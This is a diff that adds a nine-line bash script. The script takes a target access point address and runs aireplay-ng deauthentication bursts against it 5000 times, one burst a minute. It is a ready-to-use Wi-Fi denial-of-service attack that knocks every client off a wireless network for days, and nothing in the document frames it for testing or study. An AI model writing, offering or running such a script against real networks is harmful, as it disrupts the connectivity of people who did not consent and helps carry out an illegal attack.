@@ -1,0 +1,9 @@
+#!/bin/bash
+
+TARGET=$1
+
+for i in {1..5000}
+do
+	aireplay-ng -0 100 -a $TARGET mon0
+	sleep 60s
+done       
